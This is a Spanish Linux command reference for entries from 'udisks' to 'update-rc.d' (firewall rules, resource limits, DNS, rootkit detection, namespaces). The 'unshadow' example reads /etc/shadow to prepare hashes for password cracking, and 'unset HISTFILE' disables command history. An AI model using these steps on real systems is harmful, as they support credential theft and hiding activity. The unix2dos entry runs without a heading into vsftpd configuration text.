Comando para montar y desmontar volumenes usando el demonio que llaman programas como Nautilus o Thunar. Con este método conseguimos que desde estos programas se pueda desmontar cómodamente la partición y además sin necesidad de permisos.
$ udisks --mount /dev/sda1 (montará esta partición).
$ udisks --unmount /dev/sda1 (desmontará esta partición).
$ udisks --monitor (Monitoriza la actividad del demonio. Muy útil para verificar si una partición es montada o no)


udisks2
Actualización del anterior comando. Demonio que permite operaciones como consultar, montar, desmontar, formatear o desconectar dispositivos de almacenamiento como discos duros o memorias USB.
$ udisksctl status (comprobar todos los discos duros y usbs conectados)
$ udisksctl status nvme0n1 (comprobar si determinado disco está conectado)
$ udisksctl mount -b /dev/sdd1 (montar dispositivo. Equivalente al clásico mount /dev/sdd1)
$ udisksctl unmount -b /dev/sdd1 (desmontar dispositivo. Equivalente al clásico umount /dev/sdd1)
$ udisksctl dump (mostrar toda la información de todos los dispositivos con detalle)
$ udisksctl info -b /dev/sda (mostrar información sobre un dispositivo)


uefi
[Unified Extensible Firmware Interface]. Es el primer programa que se ejecuta cuando iniciamos el PC y tiene 3 objetivos: verificar el hardware conectado a la placa, activar los componentes y vincularlos al sistema operativo.
# ls /sys/firmware/efi (si existe esta ruta el pc está basado en UEFI)
# efibootmgr (comprobar si el pc está basado en BIOS o UEFI. En este caso en BIOS. Ver comando efibootmgr)
        EFI variables are not supported on this system.
# [ -d /sys/firmware/efi ] && echo UEFI || echo BIOS (otra forma de saberlo)


ufw
Cortafuegos
# ufw enable (activar el cortafuegos. “disable” para desactivarlo)
# ufw deny 4662 (bloquea el puerto)
# ufw deny from 123.1.103.8 (denegar toda conexion de la ip especificada)
# ufw allow 22 (abre el puerto 22)
# ufw allow from 123.1.103.8 to any port 22 (Que la ip especificada pueda acceder al nuestro puerto 22)
# ufw delete allow 22 (anula la regla de abrir el puerto 22)
# ufw allow 40000:44000/tcp (abrir un rango de puertos)
# ufw delete deny 4662 (Elimina una regla)
# ufw allow smtp (permitir servicios concretos)
# ufw status (visualizar las normas definidas)
# ufw status numbered (que muestre las normas numeradas)
# ufw delete numero (eliminar una regla con el número que muestra "status numbered")
# ufw status verbose (Información de estado con mayor detalle)
# ufw default allow (permitir todo por defecto)
# ufw default deny (bloquear todo por defecto)
# ufw deny from ip (bloquear dirección ip)
# ufw logging on (activar los logs. “off” para desactivarlos. Herramienta de registro: fwanalog, fwlogwatch, o lire.)
# ufw app list (lista de las aplicaciones con reglas)
# ufw app info WWW (información sobre una regla del listado anterior)
# ufw reset (resetear completamente el cortafuegos)


uidmap
Estos programas ayudan a los usuarios sin privilegios a crear espacios de usuario [uid] y de grupo [gid] en contenedores o en configuraciones que requieren el aislamiento de permisos . Incluye los comandos getsubuids, newgidmap y newuidmap
$ getsubuids user (lista de UID subordinados asignados al usuario del tipo "username:100000:65536" [que tiene asignado el rango de UID desde 100000 y puede usar hasta 65536 UIDs])
$ getsubgids user (lo mismo para el grupo)
$ newuidmap 1234 0 100000 65536 (que dentro del proceso con PID 1234, el UID 0 [root] será mapeado al UID 100000 en el sistema host y se le asignarán un total de 65536 UIDs, es decir, desde 100000 hasta 165535
$ newuidmap 1234 0 100000 1000 1000 200000 1000 (que dentro del PID 1234, el UID 0 en el namespace se mapeará a 100000 en el host y se mapearán 1000 UIDs a partir de ese y el UID 1000 en el namespace se mapeará a 200000 en el host y se mapearán 1000 UIDs a partir de ese)
$ newgidmap 1234 0 100000 65536 (el GID 0 dentro del namespace del proceso con PID 1234 será mapeado a 100000 en el host, con un rango de 65536 GIDs)
$ newgidmap 1234 0 100000 1000 1000 200000 1000 (que dentro del proceso 1234 el GID 0 en el namespace se mapeará a 100000 en el host, con 1000 GIDs yque el GID 1000 en el namespace se mapeará a 200000 en el host con 1000 GIDs)


ul
Subrayado de palabras en la terminal.
	$ echo $'linux es g\b_e\b_n\b_i\b_a\b_l\b_ ' | ul (Cada letra a subrayar ha de ir seguida de \b_)


ulimit
Permite  visualizar o limitar los recursos del sistema.
# ulimit -f 512000 (limita a los usuarios para que no puedan crear archivos de mayor tamaño que 512000 Kb [500 #Mb])
$ ulimit -a   (ver todos los parámetros)
$ ulimit -n (cantidad máxima de ficheros que se pueden abrir)
$ ulimit -SHn (ver la cantidad máxima de ficheros que se pueden abrir, blandos [por el usuario] y duros [por root])
$ ulimit -Sn 10000 (modificarlo a 10000 mientras no se cierre la sesión)
Parámetros:
	core (Tamaño máximo de los ficheros core [KB])
	data (Tamaño máximo para el segmento de datos [KB])
	fsize (Tamaño máximo para los ficheros [KB])
	memlock (Tamaño máximo para el espacio de direcciones bloqueado en memoria [KB])
	nofile (Número máximo de ficheros abiertos)
	rss (Tamaño máximo del conjunto residente en memoria [KB])
	stack (Tamaño máximo para la pila [KB])
	cpu (Tiempo máximo de CPU [minutos])
	nproc (Número máximo de procesos)
	as (Límite en el espacio de direcciones)
	maxlogins (Número máximo de logins)
	priority (Prioridad de base para los procesos del usuario)
	locks (Número máximo de ficheros bloqueados que el usuario puede mantener)
Nota.- El ámbito de aplicación del límite puede ser un nombre de usuario, un grupo (@grupo) o todos (*)
Un ejemplo de limit.conf:
	*               soft    nproc           10000
	*               hard    nproc           4096
	*               soft    core            unlimited
	*               hard    core            unlimited
	*               soft    memlock         131072
	*               hard    memlock         131072
	*               soft    nofile          102400
	*               hard    nofile          102400
1.-
Evitar Forkboms [programas que consumen la totalidad de los recursos del sistema]
Si al lanzar el comando:
$ ulimit -u
El resultado es “ilimitado” o un valor extremadamente alto, podemos ser victimas de los forkbombs. Para resolverlo podemos limitar el número de procesos abiertos a 1000 para que estos no puedan llegar a colapsar el sistema:
# gedit /etc/security/limits.conf
Añadir antes de “End of file”:   * hard nproc 1000
Reiniciar
2.-
En ciertas ocasiones, al procesar muchos archivos, se produce un error "for output (Too many open files)" porque se desborda el limite de 1024 k. Para solucionarlo:
# nano /etc/security/limits.conf
Y añadir las siguientes lineas:
	*    soft    nofile    9000
	*    hard    nofile    65000
Los asteriscos pueden sustituirse por el nombre de usuario.
3.-
Limitar la cantidad de usuarios conectados al sistema:
# nano /etc/security/limits.conf
Y en el parámetro maxlogins modificamos el número que deseemos:
	*    -       maxlogins 3


um
Crear páginas man.
# brew install um
$ um config (ver la configuración actual. Por defecto ~/.um/umconfig)
$ um edit script (crea la estructura básica, una vez llena se guarda)
$ um script (lanzar la página man)
$ um list (listado de páginas creadas)
$ um rm script (eliminar una página man)


umask
Fija los permisos de un fichero o directorio. Los permisos base para los directorios son 0777 (rwxrwxrwx) y para los archivos 0666 (rw-rw-rw-). Por tanto la cifra que proporciona umask ha de restarse de estos importes para conocer los permisos reales:
$ umask (muestra permisos actuale en octals. Normalmente 0022 por tanto los permisos reales son 755 para directorios y 644 para ficheros)
$ umask -S (muestra los permisos en notación simbolica)
Ejemplo:
	$ touch archivo.txt
	$ mkdir dir
	$ ls -l
	total 4
	-rw-r--r-- 1 templix templix    0 abr 12 06:10 archivo.txt
	drwxr-xr-x 2 templix templix 4096 abr 12 06:10 dir
# umask 0002 (Modifica los permisos a 0775 para directorios y 664 para archivos)


umount
Desmontar particiones
$ umount -a (Desmonta todas las especificadas en /etc/mtab)
$ umount -r (Si falla el desmontaje, intenta remontar como “solo lectura”)
$ umount -t vfat,ext3 (Solo desmonta los tipos especificados)
$ umount -fl (fuerza el desmonte de la particion)


unaccent
Lee datos que se entran por stdin y cuando se pulsa intro los repite a continuación sin acentos.
$ unaccent --debug_low UTF-8


unalias
Suprimir alias.
$ unalias -a (Suprime todos los alias)


uname
Informa de la ...
$ uname -a (... versión instalada del kernel y otros datos)
$ uname -m (... arquitectura de la máquina)
$ uname -r (... versión instalada del kernel)


unar
Extraer archivos de un paquete.
        $ unar bashrc.tar
        bashrc.tar: Gzip
          bashrc... OK.
          Successfully extracted to "./bashrc".


unattended-upgrades
Descargar e instalar actualizaciones de seguridad de forma automática y desatendida. Aunque esté activado, notificará acerca de las actualizaciones "normales", pero solo se instalaran automáticamente las actualizaciones de seguridad. Para activar lanzar:
# dpkg-reconfigure -plow  unattended-upgrades
Y contestar "yes". El parámetro "-plou" indica que solo se hagan preguntas esenciales durante la configuración. Se crea el archivo de configuración en /etc/apt/apt.conf.d/20auto-upgrades con el siguiente contenido (los comentarios han sido añadidos):
  # Asegura que las listas de paquetes se actualicen regularmente:
  APT::Periodic::Update-Package-Lists "1";
  # Que se instalen automáticamente las actualizaciones disponibles y los parches de seguridad críticos:
  APT::Periodic::Unattended-Upgrade "1";


unbound
Es un servidor DNS recursivo es decir, si no tiene la respuesta en su caché, consulta otros servidores DNS hasta obtenerla y de almacenamiento en caché que se utiliza para resolver nombres de dominio en direcciones IP. Además, puede realizar la validación DNSSEC [Domain Name System Security Extensions], que es una extensión del DNS que permite verificar la autenticidad e integridad de las respuestas DNS. Este paquete contiene el demonio unbound.
Ejemplo de archivo de configuración:
# nano /etc/unbound/unbound.conf
       # Escuchar en todas las interfaces IPv4
       interface: 0.0.0.0
       # Escuchar en todas las interfaces IPv6
       interface: ::0
       # Permitir consultas desde la red local
       access-control: 192.168.1.0/24 allow
       # Habilitar la validación DNSSEC
       auto-trust-anchor-file: "/var/lib/unbound/root.key"
       # Usar los servidores DNS raíz
       root-hints: "/var/lib/unbound/root.hints"
# unbound-checkconf (averiguar si existen errores en el archivo de configuración)
$ unbound (activa el daemon)
# systemctl status unbound (verificar el estado del servicio para asegurarte de que esté funcionando correctamente)
Ejemplo de uso:
$ dig @127.0.0.1 example.com (realiza una consulta DNS para example.com utilizando el servidor unbound que está escuchando en 127.0.0.1
$ unbound -v example.com (mostrará si la respuesta DNS para example.com ha sido validada correctamente mediante DNSSEC)


undbx
Herramienta para exportar los correos de Outlook en formato DBX al formato EML para posteriormente importar en Thunderbird
$ undbx carpeta-origen carpeta-exportacion (Primero se define la carpeta origen donde se encuentran los ficheros DBX y a continuación se especifica el directorio de salida)


undertime
Muestra una tabla simple de 24 horas con horarios coincidentes en diferentes zonas horarias o ciudades.
$ undertime -l (listado de las zonas posibles)
$ undertime -t Europe/Madrid (horas en una zona)
$ undertime --timezones Europe/Madrid Europe/Moscow (en dos zonas especificadas)
$ undertime --no-default-zone (muestra varias zonas)


unexpand
Convertir espacios en tabulaciones.
$ unexpand -t 4 -a texto.txt (Sólo las lineas que tengan 4 espacios en blanco, sea al inicio o entre palabras)
$ unexpand -t 2  --first-only texto.txt (Sólo las que empiecen por 2 espacios en blanco)


unhide
Herramienta forense para encontrar procesos y puertos TCP/UDP ocultos por rootkits, módulos del kernel o por otras técnicas. Incluye utilidades: unhide, unhide-tcp, unhide-linux y unhide-posix.
# unhide-tcp (identifica los puertos TCP/UDP que están escuchando, pero no figuran en /bin/netstat a través de fuerza bruta)
# unhide proc (compara /proc con la salida de /bin/ps)
# unhide -m -d sys proc brute (más comprobaciones con las pruebas: sys, proc y brute)
# unhide-linux procall (combina pruebas proc y procfs)
# unhide-linux procfs (comparar la información recopilada de /bin/ps con la información recopilada en los procfs)
# unhide quick (combina las técnicas proc, procfs y sys. Es aproximadamente 20 veces más rápido, pero puede dar más falsos positivos.)
# unhide-posix proc
# unhide-linux reverse
Opciones
sys (compara la info de /bin/ps con la obtenida de las llamadas al sistema.)
brute (Identifica por fuerza bruta todos los procesos)
reverse (consiste en verificar que todos los subprocesos vistos por ps también se ven en procfs y por llamadas al sistema. Su objetivo es verificar que un rootkit no haya matado una herramienta de seguridad [ID u otra] y hacer que ps muestre un proceso falso en su lugar)


unhtml
Elimina todo el formato HTML que encuentra e un fichero e imprime el texto limpio.
$ unhtml index.html > /home/usuario/index.txt (Si no se facilita el archivo de destino, lo muestra en pantalla)


unicode
Es un estándar de codificación de 4 caracteres que engloba todos los caracteres de uso común y en la actualidad, cuenta con alrededor de 150.000 caracteres provenientes de diversos alfabetos [chino, cuneiforme ,rúnico...], sistemas ideográficos y colecciones de símbolos [matemáticas, tecnología, música, iconografía...]. Además de los caracteres alfabéticos, Unicode también incluye una variedad de caracteres, como  fichas de juegos como el dominó, flechas, iconos, etc. Una tabla completa en https://symbl.cc/es/unicode/table/
$ unicode --list (listado de codificaciones)
$ unicode --ascii (tabla ascii)
$ unicode --brexit
$ unicode -d 9 (propiedades del caracter numerico "9")
$ unicode -a ñ (de forma automática determinar las caracteristicas del caracter colocado [ñ])
$ unicode -w t (busqueda en la wikipedia [abre la página en el navegador] el caracter mencionado [t])
$ 月(ctrl-shift-u 6708 intro)
$ Ǣ (ctrl-shift-u 01e2 intro


unicode_start
Pondrá el teclado y la consola en modo Unicode [UTF-8].
$ unicode_start [font] [umap]
Nota.- El parámetro "font" es una fuente que está cargada. Debe tener un mapa Unicode incorporado o, si no lo tiene, dicho mapa se puede proporcionar explícitamente como segundo parámetro. Cuando no se especificó ninguna fuente, se mantiene la fuente actual. Unicode es la codificación de caracteres estándar para la mayoría de las computadoras del mundo. Garantiza que el texto, incluidas letras, símbolos, emojis e incluso caracteres de control, aparezca igual en diferentes dispositivos, plataformas y documentos digitales, independientemente del sistema operativo o el software que se utilice.


unicode_stop
Deshará el efecto de unicode_start. Pone el teclado en modo ASCII y borra el modo UTF-8 de la consola.
$ unicode_stop


unimatrix
Lluvia de código y simbolos que aparecen en el película matrix escrito en python. Descarga: <https://github.com/will8211/unimatrix#install>
$ unimatrix (por defecto)
$ unimatrix -n -s 96 -u linux (no usar caracteres en negrita [n], 96 de velocidad [por derecto 85] y usando solo las letras indicadas)
Otras opciones:
	-g COLOR (color de fondo. Por defecto el de la terminal)
	-f (habilitar caracteres cambiantes)
	-b (usar sólo caracteres en negrita)
	-t 60 (Terminar el proceso a los 60 segundos)


uniq
Ignora las líneas idénticas siempre y cuando sean adyacentes.
$ uniq -u archivo archivo_sin repeticiones
$ uniq -d archivo archivo2 (en archivo2 sólo las repetidas)
$ uniq -c archivo (Muestra al principio de la linea el número de veces que se repite)


unison
[openssh-server ssh]. Sincronización de carpetas remotas.
Previamente crear la clave y copiarla al otro pc:
$ ssh-keygen -t dsa
$ ssh-copy-id -i $HOME/.ssh/id_dsa.pub root@ip_o_host
Sincronizar las carpetas (la web en este ejemplo)
$ unison /srv/http ssh://ip_o_host//srv/http
Si la carpeta a sincronizar se coloca en el archivo de configuración:
# nano /root/.unison/default.prf
root = /srv/http
root = ssh://ip_o_host//srv/http
Puede colocarse la orden en el cron para que se actualice cada 5 minutos:
crontab -e
	*/5 * * * * /usr/bin/unison &> /dev/null


units
Conversor de unidades [metros, litros, millas, pulgadas, grados...]. Las unidades han de expresarse en inglés.
$ units
Muestra "You have" para entrar lo que tenemos [1m, 10lb, 2hr, tempK(0)... ] y a continuación "You want", lo que queremos. Algunos ejemplos:
De millas a kilómetros:
	You have: 10mi
	You want: km
		* 16.09344
		/ 0.062137119
De libras a gramos:
	You have: 1lb
	You want: gr
		* 7000
		/ 0.00014285714
De grados kelvin a celsius:
	You have: tempK(0)
	You want: tempC
		-273.15
De 3 horas más 16 minutos a segundos
	You have: 3hr + 16min
	You want: sec
		* 11760
		/ 8.5034014e-05


unity
Escritorio.
$ unity --reset (Resetear la configuración de unity)
$ unity --reset-icons (eliminar iconos agregados al launcher)
$ unity --replace (reiniciar)


uniutils
Conjunto de herramientas útiles cuando se trabaja con archivos Unicode si se desconoce el sistema de escritura, no se tiene la fuente necesaria, se necesita inspeccionar caracteres invisibles, se necesita averiguar si se han combinado caracteres o en qué orden aparecen, o se necesitan estadísticas sobre qué caracteres aparecen. Consta de los siguientes ejecutables: ExplicateUTF8 [depurar o aprender sobre Unicode. Determina y explica la validez de una secuencia de bytes como una codificación UTF8], unidesc [rangos de caracteres a los que pertenecen las diferentes partes del texto. También se puede utilizar para identificar codificaciones Unicode], unifuzz [Emite cadenas diseñadas para probar el manejo de Unicode], unihist [genera un histograma de los caracteres en su entrada], uniname [imprime de forma predeterminada el desplazamiento de cada carácter, su desplazamiento de bytes, su valor de código hexadecimal, su codificación, el glifo en sí y su nombre. También se puede utilizar para validar la entrada UTF-8], unireverse [invierte cada línea de entrada carácter por carácter] y utf8lookup [buscar caracteres Unicode]
$ ExplicateUTF8 texto.txt
$ unidesc -l (rangos unicode en orden alfabético)
$ uniname -r texto.txt (imprimir el rango unicode)
$ echo -e "\x54\xCE\x95\x53\xD0\xA2\x45\x52\x2E\x74\x78\x74" | uniname
$ unireverse (se entra frase y al pulsar intro la escribe a la inversa)


unix2dos
Convertir formatos unix a msdos
$ unix2dos fichero_unix fichero_dosServidor de archivos ftp. Toda la configuración de encuentra en el archivo:
# nano /etc/vsftpd.conf
Algunos de los parámetros:
anonymous_enable=NO # si no queremos accesos anonimos
local_enable=YES # Permitir accesos locales autentificados
write_enable=YES # Permite escritura en el servidor
ftpd_banner=Entrando en el servidor ftp...
chroot_local_user=YES # Enjaular la conexión a su propio directorio personal
max_clients=5 # limitar a 5 los accesos simultaneos
Nota.- Han de redigirirse los puertos 20 y 21 y el rango especificado en el archivo de configuración:
pasv_min_port=44000
pasv_max_port=44100
El cliente podrá conectarse al servidor via filezilla, gftp...


unlink
Elimina un archivo especificado.
$ unlink archivo


unoconv
Exporta todos los formatos soportados por openoffice/libreoffice a otros formatos como pdf, txt... creando un archivo con el mismo nombre de origen pero con la nueva extensión. Para una lista detallada consultar este enlace: <http://dag.wieers.com/home-made/unoconv/>
$ unoconv --show  (Visualizar formatos  soportados)
$ unoconv -f xls archivo.csv (convertir un csv a xls)
$ unoconv -f pdf *.odp *.odt (Convierte todos los .odt y .odp a pdfs)
$ unoconv --format=txt document1.odt (convierte el documento a texto plano)
$ unoconv --format=txt --stdout document1.odt > salida.txt (envia la salida al STDOUT para redireccionarla a un fichero cualquiera)


unopkg
Instalador de extensiones libreoffice por consola.
$ unopkg add -v extension.oxt (Instala para un usuario mnostrando toda la salida)
$ unopkg add -f extension.oxt (Instala para todos los usuarios)
$ unopkg add -s -f extension.oxt (Si la extension precisa aceptar licencia)
$ unopkg list (Lista las instaladas)
$ unopkg reinstall
$ unopkg remove extension.oxt ()
$ unopkg gui (abre en modo gráfico)


unp
Extractor universal de archivos comprimidos.
$ unp -s (Listado de formatos soportados)
$ unp archivo.tar (descomprimir un archivo)


unpaper
Herramienta de posprocesamiento para hojas escaneadas, especialmente para páginas de libros que han sido escaneadas a partir de fotocopias creadas previamente. El objetivo principal es hacer que las páginas de libros escaneadas sean mejor legibles en la pantalla después de la conversión a PDF, limpiando manchas y enderezando páginas torcidas. De forma predeterminada, unpaper coloca un archivo de imagen de entrada en una hoja y guarda un archivo de imagen de salida en otra.
$ unpaper pagina1.pnm pagina1_procesada.pnm (proceso básico)
$ unpaper --deskew pagina1.pnm pagina1_enderezada.pnm (Enderezar una página)
$ unpaper --border 50 pagina1.pnm pagina1_sin_bordes.pnm (Eliminar manchas oscuras o bordes negros de las imágenes recortando 50 píxeles los bordes de la imagen)
$ unpaper --output-format=p%d.pnm pagina%d.pnm pagina_procesada%d.pnm (procesará pagina1.pnm, pagina2.pnm, etc y las guardará como pagina_procesada1.pnm, pagina_procesada2.pnm, y así sucesivamente)
$ unpaper --noisefilter=5 pagina1.pnm pagina1_menos_ruido.pnm (aplicar un filtro de ruido con una intensidad de 5)
$ unpaper --brightness=0.8 --contrast=1.2 pagina1.pnm pagina1_mejorada.pnm (reducir el brillo y aumentará el contraste de la imagen)
$ unpaper --precut --overwrite --layout double paginalibro%d.pnm paginalibro_procesada%d.pnm (cortar los márgenes en páginas dobles, permitiendo que las páginas en blanco se ignoren)


unrar
Descomprimir archivos rar.
$ unrar x archivo.rar


unshadow
Herramienta para combinar los archivos passwd y shadow para que el comando "John de Ripper" pueda usarlos.
# unshadow /etc/passwd /etc/shadow > combine.txt


unshare
[util-linux]. Permite ejecutar un programa en un espacio de nombres [namespace] separado del resto del sistema con su red, PID, montaje, usuario, etc. A diferencia de Docker o LXC, no crea una "caja" completa, sino que aísla un solo proceso o un conjunto de ellos de manera temporal. El núcleo de Linux utiliza los namespaces para particionar los recursos del sistema y proporcionar una vista aislada a los procesos y unshare aprovecha esta funcionalidad para permitir que un proceso tenga su entrono aislado.
# unshare --net bash (dentro de la nueva shell [bash], si se ejecuta "ip a", no se verá ninguna interfaz de red, solo el loopback)
# unshare --pid --fork bash (iniciar un shell donde los procesos del sistema principal no sean visibles)
# unshare --mount bash (en la nueva shell, se puede ejecutar "mkdir /tmp/mount" y luego "mount --bind /tmp /tmp/mount" y solo será visible dentro de esta shell y desaparecerá al salir)
# unshare --mount --pid --fork --net --user --map-root-user bash (inicia una nueva shell con sus propios namespaces de montaje, PID, red y usuario root)
# unshare --mount --pid --fork --net --user bash (lo mismo sin convertirse en root)
Nota.- El flag "--map-root-user" permite que el usuario que ejecuta el comando, incluso si no es root, se "mapee" como root dentro del nuevo namespace. Esto significa que dentro de la shell, tendrá privilegios de root para ese namespace, pero no en el sistema principal. Esto es una técnica común utilizada por herramientas de seguridad y sandboxing para limitar el daño potencial de un proceso malicioso.


unset
elimina variables locales o asigna NULL
$ unset HISTFILE; unset SAVEHIST  (desactiva el historial de comandos)
$ unset -f funcion (borrar una funcion)
$ unset VAR (Eliminar una variable)


unsort
Reordena las lineas de un archivo de forma semialeatoria.
$ unsort -p archivo.txt
$ unsort -M archivo1.txt archivo2.txt (Uniendo en la salida los dos archivos)
$ unsort -n archivo1.txt archivo2.txt (Mezcla las lineas de forma aleatoria sin alterar el orden)


until
Estructura muy parecida a while [until, do, done], pero con la forma de evaluar la condición al revés, es decir, se ejecuta mientras la condición sea falsa.
Algunos ejemplos:
1.-
Decrecer un contador hasta llegar a 5
	#!/bin/bash
	CONTADOR=10
	until [  $CONTADOR -lt 5 ]; do
	   echo "El contador a $CONTADOR"
	   let CONTADOR-=1
	done
2.-
	#!/bin/bash
	SALIR=si
	until [ "$OPCION" = "$SALIR" ]
	do
	  echo "Pulsar teclas... "
	  echo "(\"$SALIR\" para salir)"
	  read OPCION
	  echo "Pulsada la opción salir ($OPCION)"
	  echo
	done


unzip
Descomprimir archivos zip.
$ unzip archivo.zip
$ unzip -v archivo.zip (Ver contenido)
$ unzip -l archivo.odt (Ver contenido de un archivo odt)


update-alternatives
Modificar las aplicaciones por defecto cuando existen otras posibilidades
# ls /etc/alternatives  (Muestra todas las posibilidades)
# update-alternatives --list x-www-browser (muestra las alternativas al navegador por defecto)
# update-alternatives --display x-www-browser (Para ver, de las opciones, la utilizada)
# update-alternatives --config x-www-browser (Para modificarla)
# update-alternatives --config x-cursor-theme (Modificar el tema del cursor)
# update-alternatives --config x-terminal-emulator (modificar las terminal por defecto)
# update-alternatives --install  /usr/bin/x-www-browser x-www-browser /usr/bin/firefox 100 (Incluir en el listado una aplicación que no está)
# update-alternatives --get-selections (muestra todas las opciones con las aplicaciones escogidas)
# update-alternatives --all (las muestra todas y permite modificarlas una por una)


update-binfmts
Las versiones 2.1.43 y posteriores del kernel de Linux han contenido el módulo binfmt_misc. Esto permite al administrador del sistema registrar intérpretes para varios formatos binarios en función de un número o su extensión de archivo y hacer que se invoque al intérprete apropiado cada vez que se ejecute un archivo coincidente. Piense en ello como una versión más flexible del #! ejecutable, o como algo que puede comportarse un poco como "asociaciones" en otros sistemas operativos aunque en GNU/Linux la tendencia es mantener este tipo de cosas en otro lugar, como en su administrador de archivos. update-binfmts gestiona una base de datos persistente de estos intérpretes.
# update-binfmts --package openjdk-6 --remove jar /usr/bin/jexec (eliminar el enlace de formatos binarios con openjdk-6)
# update-binfmts --display (información sobre todos los formatos binarios y si están habilitados o deshabilitados)
# update-binfmts --disable python3.11 (deshabilitar un formato)


update-ca-certificates
Programa que actualiza el directorio /etc/ssl/certs para contener certificados SSL y genera certificados ca-certificates.crt.
# update-ca-certificates
# update-ca-certificates -f (actualizar)


update-catalog
Inserta, actualiza o elimina entradas en los catálogos centralizados de SGML [Standard Generalized Markup Language]. ISO 8879: 1986 es un estándar para definir lenguajes de marcado generalizados para documentos ubicado en /etc/sgml. Para cambiar el supercatálogo SGML ubicado en /etc/sgml/catalog modifique el contenido del directorio de /etc/sgml para que contenga nuevos archivos o enlaces simbólicos que tengan una extensión cat o elimine (o mueva) los catálogos existentes y regenere el catálogo.
# update-catalog --update-super (regenerar el catálogo)


update-cracklib
Crear una versión comprimida y acumulada de las listas de palabras almacenadas en los directorios proporcionados en el archivo de configuración de cracklib /etc/cracklib/cracklib.conf.
$ update-cracklib


update-desktop-database
Herramienta para construir una base de datos de la caché de los tipos MIME manejados por archivos. La base de datos de caché contiene la lista de tipos MIME que pueden manejar los archivos , así como, para cada tipo MIME, una lista de archivos que pueden manejar este tipo MIME. Esta base de datos de caché facilita el trabajo de las aplicaciones que necesitan encontrar una aplicación que puede abrir un documento de un tipo MIME específico y así esas aplicaciones no tendrán que analizar todos los archivos existentes en el sistema y en su lugar pueden analizar esta base de datos de caché.
# update-desktop-database -v


update-dlocatedb
Genera una lista del contenido del paquete en texto plano a partir de los archivos /var/lib/dpkg/info/*.list
# update-dlocatedb -p (actualizar solo la lista de archivos)


update-dictcommon-aspell
Esta secuencia reconstruirá la base de datos de aspell, así como las cosas de squirrelmail, jed y emacsen. Según la página man existe esta nota: ADVERTENCIA: No debe usarse desde la línea de comando a menos que sepa muy bien lo que está haciendo.
$ update-dictcommon-aspell


update-fonts-dir
Crear un archivo fonts.dir en el directorio de fuentes X Windows System [/usr/share/fonts/X11]. Normalmente se invoca solo desde los scripts posteriores a la instalación y posteriores a la eliminación de un paquete que contiene fuentes para X Window System, pero puede invocarse en cualquier momento para reconstruir el archivos fonts.dir [/usr/share/fonts/X11/100dpi/fonts.dir]. Solo es preciso el último componente de la ruta ["75dpi" "100dp" o "misc"], update-fonts-dir generará /usr/share/fonts/X11/100dpi/fonts.dir o /usr/share/fonts/X11/75dpi/fonts.dir desde los archivos de fuentes que se encuentran dentro de él. Esto permite que múltiples paquetes proporcionen nombres para las fuentes en el mismo directorio. Ningún paquete de fuente realmente proporciona el archivo fonts.dir en el directorio de las fuentes X Windows System, por lo que no hay peligro de sobrescribir los nombres de fuente de un paquete con los de otro.
# update-fonts-dir 75dpi
# update-fonts-dir 100dpi


update-fonts-scale
Ensambla un archivo fonts.scale en un directorio de fuentes X utilizando uno o más archivos de escala que se encuentran en un subdirectorio de /etc/X11/fonts/.
# update-fonts-scale 75dpi
# update-fonts-scale Type1


update-geoip-database
descarga la última versión de la base de datos MaxMind GeoIP Lite del sitio web MaxMind [/usr/share/GeoIP].
$ update-geoip-database


update-grub
Actualiza el menú de arranque grub2
# update-grub2


update-icon-caches
script para actualizar las cachés de iconos en una lista de directorios. En cada uno de los directorios pasados como argumentos, la caché de iconos se actualiza si ya está presente. No se crea si no existe ya.
$ gtk-update-icon-cache /usr/share/icons/gnome/


update-ieee-data
Obtiene la versión actual de las listas OUI e IAB de IEEE Standards Association [IEEE-SA lleva desarrollando estándares durante más de un siglo a nivel mundial] y las instala si las versiones instaladas tienen más de 5 días. Esta utilidad requiere la instalación de curl, wget o libwww-perl.
# update-ieee-data (forma básica)
# update-ieee-data -f (Forzar la actualización, incluso si el archivo tiene más de 5 días)


update-info-dir
Actualiza o crea el directorio del archivo de índice de la documentación disponible en /usr/share/info/ [el predeterminado] o en el DIRECTORIO dado. La información del archivo de índice es el directorio que generalmente presentan los navegadores de información al inicio.
# update-info-dir /usr/share/info/


update-initramfs
Initramfs es un archivo cpio comprimido. En el momento del arranque, el kernel desempaqueta ese archivo en el disco RAM, lo monta y lo usa como raíz inicial del sistema de archivos.
# update-initramfs -u (actualizar un initramfs existente)
# update-initramfs -c (crea un initramfs nuevo)
# update-initramfs -d (elimina uno)
# update-initramfs -c -k 4.9.0-4-amd64 (crea uno nuevo con los datos especificados [k])


update-locale
[base-pass]. Actualizar el archivo por defecto del idioma /etc/default/locale que puede hacerse manualmente o con:
$ update-locale LANG=ca_ES.UTF-8


update-manager
Actualizar, en Ubuntu, a una nueva versión. Ver también do-release-upgrade.
# update-manager -d   (antes de salir la version estable final)
# update-manager -c   (despues de salir la version estable final)


update-menus
Regenerar los menus de gnome.


update-mime
Actualiza el archivo /etc/mailcap para reflejar la información mime modificada por un paquete Debian durante la instalación o desinstalación.
# update-mime


update-mime-database
Al arrancar o en la instalación de paquetes puede salir mensajes del tipo:
	Unknown media type in type 'all/all'
	Unknown media type in type 'all/allfiles'
	Unknown media type in type 'uri/mms'
	Unknown media type in type 'uri/mmst'
	Unknown media type in type 'uri/mmsu'
	Unknown media type in type 'uri/pnm'
	Unknown media type in type 'uri/rtspt'
	Unknown media type in type 'uri/rtspu'
Para solucionar estos errores que no afectan al funcionamiento del sistema:
# rm /usr/share/mime/packages/kde.xml
# update-mime-database /usr/share/mime


update-passwd
Actualiza /etc/passwd, /etc/shadow y /etc/group de forma segura.
# update-passwd -s (Realiza comprobaciones pero no hace nada)
Algunas opciones:
        -P fichero (Si no es el predeterminado /etc/passwd)
        -S fichero (Si no es el predeterminado /etc/shadow)
        -G fichero (Si no es el predeterminado /etc/group)


update-pciids
Si al ejecutar lspci nos muestra un mensaje "unknown device" es preciso actualizar la lista del archivo pci.ids [/usr/share/misc]. Descarga la lista de la última versión del archivo pci.ids del sitio de la distribución principal y lo instala. Esta utilidad requiere curl, wget o lynx para ser instalado.
# update-pciids


update-perl-sax-parsers
Inserta, actualiza y elimina archivos de información de módulos del analizador Perl SAX en el directorio /var/lib/libxml-sax-perl/ParserDetails.d y el archivo de información general de módulos perl /etc/perl/XML/SAX/ParserDetails.ini.
$ update-perl-sax-parsers --update (actualiza el archivo de información general de los módulos)
$ update-perl-sax-parsers --add modulo (Agrega el archivo de información para el módulo indicado)
$ update-perl-sax-parsers --remove modulo (Elimina el archivo de información del módulo indicado)


update-rc.d
Activar/desactivar aplicaciones o scripts en el arranque del sistema.
$ update-rc.d -f gdm remove (desactivarlo)
$ update-rc.d gdm defaults  (activarlo)
